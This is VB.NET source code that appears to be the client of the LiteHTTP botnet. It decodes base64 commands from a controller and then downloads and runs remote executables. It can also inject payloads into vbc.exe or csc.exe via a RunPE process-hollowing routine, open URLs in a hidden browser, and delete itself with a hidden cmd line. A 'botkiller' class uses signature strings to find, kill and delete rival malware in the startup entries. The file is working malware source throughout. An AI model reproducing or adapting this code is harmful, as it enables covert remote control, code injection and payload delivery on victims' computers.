Namespace LiteHTTP.Classes

    Class Misc

        Public Shared bkillThread As Threading.Thread

        Public Shared surrogates As String() = {Environment.GetEnvironmentVariable("windir") & "\Microsoft.NET\Framework\v2.0.50727\vbc.exe", Environment.GetEnvironmentVariable("windir") & "\Microsoft.NET\Framework\v2.0.50727\csc.exe"}

        Private Shared r As Random = New Random()

        Public Shared Function hash(ByVal input As String) As String
            Dim md5 As Security.Cryptography.MD5CryptoServiceProvider = New Security.Cryptography.MD5CryptoServiceProvider()
            Dim temp As Byte() = md5.ComputeHash(Text.Encoding.UTF8.GetBytes(input))
            Dim sb As Text.StringBuilder = New Text.StringBuilder()
            For i As Integer = 0 To temp.Length - 1
                sb.Append(temp(i).ToString("x2"))
            Next

            Return sb.ToString().ToUpper()
        End Function

        Public Shared Function getLocation() As String
            Dim res As String = Reflection.Assembly.GetExecutingAssembly().Location
            If res = "" OrElse res Is Nothing Then
                res = Reflection.Assembly.GetEntryAssembly().Location
            End If

            Return res
        End Function

        Public Shared Function isAdmin() As Boolean
            Dim id As Security.Principal.WindowsIdentity = Security.Principal.WindowsIdentity.GetCurrent()
            Dim pr As Security.Principal.WindowsPrincipal = New Security.Principal.WindowsPrincipal(id)
            If pr.IsInRole(Security.Principal.WindowsBuiltInRole.Administrator) Then
                Return True
            Else
                Return False
            End If
        End Function

        Public Shared Function lastReboot() As String
            Dim res As String = Nothing
            Dim since As Double = New Microsoft.VisualBasic.Devices.Computer().Clock.TickCount / 1000 / 60
            If since > 60 Then
                since = since / 60
                If since > 24 Then
                    since = since / 24
                    res = (CInt(since)).ToString() & " day(s) ago"
                Else
                    res = (CInt(since)).ToString() & " hour(s) ago"
                End If
            Else
                res = (CInt(since)).ToString() & " minute(s) ago"
            End If

            Return res
        End Function

        Public Shared Function randomString(ByVal length As Integer) As String
            Dim b As Char() = "abcdefghijklmnopqrstuvwxyz".ToCharArray()
            Microsoft.VisualBasic.VBMath.Randomize()
            Dim s As Text.StringBuilder = New Text.StringBuilder()
            For i As Integer = 1 To length - 1
                Dim z As Integer = (CInt((((b.Length - 2) + 1) * Microsoft.VisualBasic.VBMath.Rnd()))) + 1
                s.Append(b(z))
            Next

            Return s.ToString()
        End Function

        Public Shared Function keyExists(ByVal key As String) As Boolean
            Dim exists As Boolean = False
            Dim reg As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", False)
            For Each r As String In reg.GetValueNames()
                If r = key Then exists = True
            Next

            Return exists
        End Function

        Public Shared Function processTask(ByVal task As String, ByVal param As String) As Boolean
            Dim dt As String = Text.Encoding.UTF8.GetString(Convert.FromBase64String(task))
            Dim dp As String = Text.Encoding.UTF8.GetString(Convert.FromBase64String(Text.Encoding.UTF8.GetString(Convert.FromBase64String(param))))
            Select Case dt
                Case "1"
                    If dlex(dp) Then Return True Else Return False
                Case "2"
                    If dlex(dp, "", True) Then Return True Else Return False
                Case "3"
                    If dlex(dp, dp.Split("~"c)(1)) Then Return True Else Return False
                Case "4"
                    If visit(dp) Then Return True Else Return False
                Case "5"
                    If visit(dp, True) Then Return True Else Return False
                Case "6"
                    If bkill() Then Return True Else Return False
                Case "7"
                    Try
                        bkillThread = New Threading.Thread(New Threading.ThreadStart(AddressOf bkillp))
                        bkillThread.Start()
                        Return True
                    Catch
                        Return False
                    End Try

                Case "8"
                    Try
                        bkillThread.Abort()
                        bkillThread = Nothing
                        Return True
                    Catch
                        Return False
                    End Try

                Case "9"
                    If update(dp) Then Return True Else Return False
                Case "10"
                    If uninstall() Then Return True Else Return False
                Case Else
                    Return False
            End Select
        End Function

        Private Shared Function dlex(ByVal url As String, ByVal Optional cmdline As String = "", ByVal Optional inject As Boolean = False) As Boolean
            Try
                Dim wc As Net.WebClient = New Net.WebClient()
                wc.Proxy = Nothing
                If Not inject Then
                    Dim filename As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & randomString(7) & ".exe"
                    wc.DownloadFile(url, filename)
                    Dim si As ProcessStartInfo = New System.Diagnostics.ProcessStartInfo()
                    si.FileName = filename
                    si.Arguments = cmdline
                    Process.Start(si)
                    Return True
                Else
                    Dim file As Byte() = wc.DownloadData(url)
                    Randomize()
                    Dim surrogate As String = surrogates(r.[Next](0, surrogates.Length - 1))
                    RunPE.Run(file, surrogate)
                    Return True
                End If
            Catch
                Return False
            End Try
        End Function

        Private Shared Function update(ByVal url As String) As Boolean
            Try
                dlex(url)
                Program.s.Abort()
                If keyExists(Settings.startupkey) Then
                    Dim regkey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
                    regkey.DeleteValue(Settings.startupkey)
                End If

                Dim si As ProcessStartInfo = New ProcessStartInfo()
                si.FileName = "cmd.exe"
                si.Arguments = "/C ping 1.1.1.1 -n 1 -w 4000 > Nul & Del """ & getLocation() & """"
                si.CreateNoWindow = True
                si.WindowStyle = ProcessWindowStyle.Hidden

                Process.Start(si)
                Return True
            Catch
                Return False
            End Try
        End Function

        Private Shared Function visit(ByVal url As String, ByVal Optional hide As Boolean = False) As Boolean
            Try
                If Not hide Then
                    Process.Start(url)
                    Return True
                Else
                    Dim view As Threading.Thread = New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf viewhidden))
                    view.SetApartmentState(Threading.ApartmentState.STA)
                    view.Start(url)
                    Return True
                End If
            Catch
                Return False
            End Try
        End Function

        Private Shared Sub viewhidden(ByVal url As Object)
            Try
                Dim wb As Windows.Forms.WebBrowser = New Windows.Forms.WebBrowser()
                wb.ScriptErrorsSuppressed = True
                wb.Navigate(CStr(url))
                Windows.Forms.Application.Run()
            Catch
            End Try
        End Sub

        Private Shared Function bkill() As Boolean
            Removal.ScanThread()
            Return True
        End Function

        Private Shared Sub bkillp()
            Do
                bkill()
                Threading.Thread.Sleep(r.[Next](5000, 30000))
            Loop While True
        End Sub

        Private Shared Function uninstall() As Boolean
            Try
                Program.s.Abort()
                If keyExists(Settings.startupkey) Then
                    Dim regkey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
                    regkey.DeleteValue(Settings.startupkey)
                End If

                Dim si As ProcessStartInfo = New ProcessStartInfo With {
                    .FileName = "cmd.exe",
                    .Arguments = "/C ping 1.1.1.1 -n 1 -w 4000 > Nul & Del """ & getLocation() & """",
                    .CreateNoWindow = True,
                    .WindowStyle = ProcessWindowStyle.Hidden
                }
                Process.Start(si)
                Return True
            Catch
                Return False
            End Try
        End Function

        Public Class RunPE

            <Runtime.InteropServices.DllImport("ntdll")>
            Private Shared Function NtUnmapViewOfSection(ByVal hProc As IntPtr, ByVal baseAddr As IntPtr) As UInteger
            End Function

            <Runtime.InteropServices.DllImport("ntdll")>
            Private Shared Function ReadProcessMemory(ByVal hProc As IntPtr, ByVal baseAddr As IntPtr, ByRef bufr As IntPtr, ByVal bufrSize As Integer, ByRef numRead As IntPtr) As Boolean
            End Function

            <Runtime.InteropServices.DllImport("ntdll")>
            Private Shared Function ResumeThread(ByVal hThread As IntPtr) As UInteger
            End Function

            <Runtime.InteropServices.DllImport("ntdll")>
            Private Shared Function CreateProcess(ByVal appName As String, ByVal commandLine As Text.StringBuilder, ByVal procAttr As IntPtr, ByVal thrAttr As IntPtr, <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> ByVal inherit As Boolean, ByVal creation As Integer, ByVal env As IntPtr, ByVal curDir As String, ByVal sInfo As Byte(), ByVal pInfo As IntPtr()) As Boolean
            End Function

            <Runtime.InteropServices.DllImport("ntdll")>
            Private Shared Function GetThreadContext(ByVal hThr As IntPtr, ByVal ctxt As UInteger()) As Boolean
            End Function

            <Runtime.InteropServices.DllImport("ntdll")>
            Private Shared Function SetThreadContext(ByVal hThr As IntPtr, ByVal ctxt As UInteger()) As Boolean
            End Function

            <Runtime.InteropServices.DllImport("ntdll")>
            Private Shared Function VirtualAllocEx(ByVal hProc As IntPtr, ByVal addr As IntPtr, ByVal sizel As IntPtr, ByVal allocType As Integer, ByVal prot As Integer) As IntPtr
            End Function

            <Runtime.InteropServices.DllImport("ntdll")>
            Private Shared Function WriteProcessMemory(ByVal hProcess As IntPtr, ByVal lpBaseAddress As IntPtr, ByVal lpBuffer As Byte(), ByVal nSize As UInteger, ByRef lpNumberOfBytesWritten As Integer) As Boolean
            End Function

            Public Shared Sub Run(ByVal bytes As Byte(), ByVal surrogate As String)
                Dim zero As IntPtr = IntPtr.Zero
                Dim pInfo As IntPtr() = New IntPtr(3) {}
                Dim sInfo As Byte() = New Byte(67) {}
                Dim num2 As Integer = BitConverter.ToInt32(bytes, 60)
                Dim num As Integer = BitConverter.ToInt16(bytes, num2 + 6)
                Dim ptr2 As IntPtr = New IntPtr(BitConverter.ToInt32(bytes, num2 + 84))
                If CreateProcess(Nothing, New Text.StringBuilder(surrogate), zero, zero, False, 4, zero, Nothing, sInfo, pInfo) Then
                    Dim ctxt As UInteger() = New UInteger(178) {}
                    ctxt(0) = 65538
                    If GetThreadContext(pInfo(1), ctxt) Then
                        Dim baseAddr As IntPtr = New IntPtr(ctxt(41) + 8L)
                        Dim bufr As IntPtr = IntPtr.Zero
                        Dim ptr5 As IntPtr = New IntPtr(4)
                        Dim numRead As IntPtr = IntPtr.Zero
                        If ReadProcessMemory(pInfo(0), baseAddr, bufr, CInt(ptr5), numRead) AndAlso (NtUnmapViewOfSection(pInfo(0), bufr) = 0L) Then
                            Dim num3 As Integer = 0
                            Dim addr As IntPtr = New IntPtr(BitConverter.ToInt32(bytes, num2 + 52))
                            Dim sizel As IntPtr = New IntPtr(BitConverter.ToInt32(bytes, num2 + 80))
                            Dim lpBaseAddress As IntPtr = VirtualAllocEx(pInfo(0), addr, sizel, 12288, 64)
                            WriteProcessMemory(pInfo(0), lpBaseAddress, bytes, CUInt((CInt(ptr2))), num3)
                            Dim num4 As Integer = num - 1
                            Dim num6 As Integer = num4
                            For i As Integer = 0 To num6
                                Dim dst As Integer() = New Integer(9) {}
                                Buffer.BlockCopy(bytes, (num2 + 248) + (i * 40), dst, 0, 40)
                                Dim buffer2 As Byte() = New Byte((dst(4) - 1) + 1 - 1) {}
                                Buffer.BlockCopy(bytes, dst(5), buffer2, 0, buffer2.Length)
                                sizel = New IntPtr(lpBaseAddress.ToInt32() + dst(3))
                                addr = New IntPtr(buffer2.Length)
                                WriteProcessMemory(pInfo(0), sizel, buffer2, CUInt((CInt(addr))), num3)
                            Next

                            sizel = New IntPtr(ctxt(41) + 8L)
                            addr = New IntPtr(4)
                            WriteProcessMemory(pInfo(0), sizel, BitConverter.GetBytes(lpBaseAddress.ToInt32()), CUInt((CInt(addr))), num3)
                            ctxt(44) = CUInt((lpBaseAddress.ToInt32() + BitConverter.ToInt32(bytes, num2 + 40)))
                            SetThreadContext(pInfo(1), ctxt)
                        End If
                    End If

                    ResumeThread(pInfo(1))
                End If
            End Sub
        End Class

        Public Class Removal

            Public Shared applocal As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)

            Public Shared temp As String = Environment.GetEnvironmentVariable("temp")

            Public Shared startup As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup)

            Public Shared appdata As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)

            Public Shared users As String = Environment.GetEnvironmentVariable("userprofile")

            Public Shared split1 As Char = ChrW(5)
            Public Shared split2 As Char = ChrW(6)

            Private Shared keylogger As String() = {"SetWindowsHookEx", "GetForegroundWindow", "GetWindowText", "GetAsyncKeyState"}

            Private Shared injector As String() = {"SetThreadContext", "ZwUnmapViewOfSection", "VirtualAllocEx", "GetExecutingAssembly", "System.Reflection"}

            Private Shared ircbot As String() = {"PRIVMSG", "JOIN", "USER", "NICK"}

            Private Shared generic As String() = {"WSAStartup", "gethostbyname", "gethostbyaddr", "gethostname", "bs_fusion_bot", "MAP_GETCOUNTRY", "VS_VERSION_INFO", "LookupAccountNameA", "CryptUnprotectData", "Blackshades NET"}

            Private Shared crypter As String() = {"MD5CryptoServiceProvider", "RijndaelManaged"}

            Private Shared lobj As List(Of PossibleThreat) = New List(Of PossibleThreat)()

            Public Structure PossibleThreat

                Public fullpath As String

                Public running As Boolean

                Public btype As JudgedAs

                Public regkey As String

                Public exename As String
            End Structure

            Public Enum JudgedAs
                Unknown = 17
                Keylogger = 18
                GenericBot = 19
                Injector = 20
                IRC_Bot = 21
            End Enum

            Public Shared Sub ScanThread()
                Dim exscan As Threading.Thread = New Threading.Thread(New Threading.ThreadStart(AddressOf scan))
                exscan.SetApartmentState(Threading.ApartmentState.STA)
                exscan.Start()
                GC.Collect()
            End Sub

            Public Shared Sub scan()
                Try
                    lobj.Clear()
                    Dim suspicious As List(Of String) = New List(Of String)()
                    For Each s As String In returnHKCU("Software\Microsoft\Windows\CurrentVersion\Run")
                        suspicious.Add(s)
                    Next

                    For Each s As String In returnHKCU("Software\Microsoft\Windows\CurrentVersion\RunOnce")
                        suspicious.Add(s)
                    Next

                    For Each s As String In returnHKLM("Software\Microsoft\Windows\CurrentVersion\Run")
                        suspicious.Add(s)
                    Next

                    For Each s As String In returnHKLM("Software\Microsoft\Windows\CurrentVersion\RunOnce")
                        suspicious.Add(s)
                    Next

                    For Each s As String In returnDirs(Environment.GetFolderPath(Environment.SpecialFolder.Startup))
                        suspicious.Add(s)
                    Next

                    For Each f As String In suspicious
                        Try
                            If usepath(f.Split(split1)(0)) Then lobj.Add(scanFile(f))
                        Catch
                        End Try
                    Next

                    For i = 0 To lobj.Count - 1
                        removeThreat(i)
                        i += 1
                    Next
                Catch
                End Try
            End Sub

            Public Shared Function scanFile(ByVal path As String) As PossibleThreat
                Try
                    If System.IO.File.Exists(path.Split(split1)(0)) Then
                        Dim info As PossibleThreat = New PossibleThreat()
                        info.fullpath = path.Split(split1)(0)
                        info.regkey = path.Split(split1)(1)
                        info.running = isRunning(path)
                        info.exename = IO.Path.GetFileName(info.fullpath)
                        info.btype = JudgedAs.Unknown
                        If info.fullpath = Misc.getLocation() Then Return New PossibleThreat()
                        Dim tempstr As String = System.Text.Encoding.UTF8.GetString(System.IO.File.ReadAllBytes(info.fullpath)).Trim(ChrW(0))
                        If tempstr IsNot Nothing Then
                            For Each s As String In generic
                                If tempstr.Contains(s) Then info.btype = JudgedAs.GenericBot
                            Next

                            For Each s As String In keylogger
                                If tempstr.Contains(s) Then info.btype = JudgedAs.Keylogger
                            Next

                            For Each s As String In injector
                                If tempstr.Contains(s) Then info.btype = JudgedAs.Injector
                            Next

                            For Each s As String In ircbot
                                If tempstr.Contains(s) Then info.btype = JudgedAs.IRC_Bot
                            Next

                            Return info
                        Else
                            Return New PossibleThreat()
                        End If
                    Else
                        Return New PossibleThreat()
                    End If
                Catch
                    Return New PossibleThreat()
                End Try
            End Function

            Private Shared Sub removeThreat(ByVal lid As Integer)
                Try
                    For Each p As Process In Process.GetProcesses()
                        Try
                            If p.MainModule.FileName = lobj(lid).fullpath Then
                                p.Kill()
                                Threading.Thread.Sleep(1000)
                            End If
                        Catch
                        End Try
                    Next

                    System.IO.File.Delete(lobj(lid).fullpath)
                    Threading.Thread.Sleep(1000)
                    If lobj(lid).regkey <> "" OrElse lobj(lid).regkey IsNot Nothing Then
                        Select Case lobj(lid).regkey.Split("\"c)(0)
                            Case "HKEY_CURRENT_USER"
                                Dim tmp As String = lobj(lid).regkey.Remove(0, lobj(lid).regkey.IndexOf("\", StringComparison.Ordinal) + 1)
                                Dim subkey As String = tmp.Substring(0, tmp.LastIndexOf("\"c))
                                Dim name As String = tmp.Remove(0, tmp.LastIndexOf("\"c) + 1)
                                Dim regkey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(subkey, True)
                                regkey.DeleteValue(name)
                            Case "HKEY_LOCAL_MACHINE"
                                Dim tmp2 As String = lobj(lid).regkey.Remove(0, lobj(lid).regkey.IndexOf("\", StringComparison.Ordinal) + 1)
                                Dim subkey2 As String = tmp2.Substring(0, tmp2.LastIndexOf("\"c))
                                Dim name2 As String = tmp2.Remove(0, tmp2.LastIndexOf("\"c) + 1)
                                Dim regkey2 As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(subkey2, True)
                                regkey2.DeleteValue(name2)
                        End Select
                    End If

                    Threading.Thread.Sleep(1000)
                Catch
                End Try
            End Sub

            Private Shared Function usepath(ByVal path As String) As Boolean
                If path.Contains(users) Then Return True Else Return False
            End Function

            Private Shared Function returnHKCU(ByVal key As String) As List(Of String)
                Dim rstrs As List(Of String) = New List(Of String)()
                For Each r As String In Microsoft.Win32.Registry.CurrentUser.OpenSubKey(key, False).GetValueNames()
                    Dim rv As String = CStr(Microsoft.Win32.Registry.CurrentUser.OpenSubKey(key, False).GetValue(r))
                    If rv.Contains("""") Then rv = rv.Split(""""c)(1)
                    If rv.Contains("-") Then rv = rv.Split("-"c)(0)
                    If rv.Contains("/") Then rv = rv.Split("/"c)(0)
                    If rv.Contains(".exe") OrElse rv.Contains(".dll") OrElse rv.Contains(".bat") OrElse rv.Contains(".vbs") OrElse rv.Contains(".scr") Then rstrs.Add(rv & split1 & "HKEY_CURRENT_USER\" & key & "\" & r)
                Next

                Return rstrs
            End Function

            Private Shared Function returnHKLM(ByVal key As String) As List(Of String)
                Dim rstrs As List(Of String) = New List(Of String)()
                For Each r As String In Microsoft.Win32.Registry.LocalMachine.OpenSubKey(key, False).GetValueNames()
                    Dim rv As String = CStr(Microsoft.Win32.Registry.LocalMachine.OpenSubKey(key, False).GetValue(r))
                    If rv.Contains("""") Then rv = rv.Split(""""c)(1)
                    If rv.Contains("-") Then rv = rv.Split("-"c)(0)
                    If rv.Contains("/") Then rv = rv.Split("/"c)(0)
                    If rv.Contains(".exe") OrElse rv.Contains(".dll") OrElse rv.Contains(".bat") OrElse rv.Contains(".vbs") OrElse rv.Contains(".scr") Then rstrs.Add(rv & split1 & "HKEY_LOCAL_MACHINE\" & key & "\" & r)
                Next

                Return rstrs
            End Function

            Private Shared Function returnDirs(ByVal path As String) As List(Of String)
                Dim rstrs As List(Of String) = New List(Of String)()
                For Each f As System.IO.FileInfo In New System.IO.DirectoryInfo(path).GetFiles()
                    If f.FullName.Contains(".exe") OrElse f.FullName.Contains(".dll") OrElse f.FullName.Contains(".bat") OrElse f.FullName.Contains(".vbs") OrElse f.FullName.Contains(".scr") Then rstrs.Add(f.FullName + split1 + f.FullName)
                Next

                Return rstrs
            End Function

            Private Shared Function isRunning(ByVal fullpath As String) As Boolean
                Dim ret As Boolean = False
                Try
                    For Each p As Process In Process.GetProcesses()
                        If p.MainModule.FileName = fullpath Then ret = True
                        Exit For
                    Next
                Catch
                End Try

                Return ret
            End Function
        End Class
    End Class
End Namespace
